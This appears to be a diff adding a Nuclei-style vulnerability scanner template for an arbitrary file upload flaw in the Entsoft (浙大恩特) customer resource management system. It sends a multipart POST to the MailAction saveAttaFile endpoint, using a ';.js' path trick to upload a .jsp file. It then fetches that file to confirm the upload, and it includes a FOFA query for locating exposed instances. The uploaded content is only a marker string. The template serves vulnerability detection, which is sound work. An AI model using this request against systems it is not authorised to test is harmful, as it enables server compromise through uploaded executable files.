@@ -1,0 +1,54 @@
+id: ZheDaEnTe-MailAction-FileUpload
+
+info:
+  name: 浙大恩特客户资源管理系统-MailAction-任意文件上传
+  author: candada
+  severity: critical
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: app="浙大恩特客户资源管理系统"
+  tags: FileUpload
+
+variables:
+  file_name: "checkSecurity.jsp"
+  file_content: "This website has a vulnerability!!!"
+
+http:
+  - raw:
+      - |
+        POST /entsoft/MailAction.entphone;.js?act=saveAttaFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9
+        Connection: close
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: multipart/form-data; boundary=67c5b8312ede35631138ce3d345fe3c1
+
+        --67c5b8312ede35631138ce3d345fe3c1
+        Content-Disposition: form-data; name="file"; filename={{file_name}}
+        Content-Type: xxx/txt
+
+        {{file_content}}
+        --67c5b8312ede35631138ce3d345fe3c1--
+        
+      - |+
+        GET {{file_path}} HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_2, '{{file_content}}')"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: file_path
+        internal: true
+        part: body_1
+        regex:
+          - '/enterdoc/EnterMail/(\d+)/(\d+)/checkSecurity.jsp'
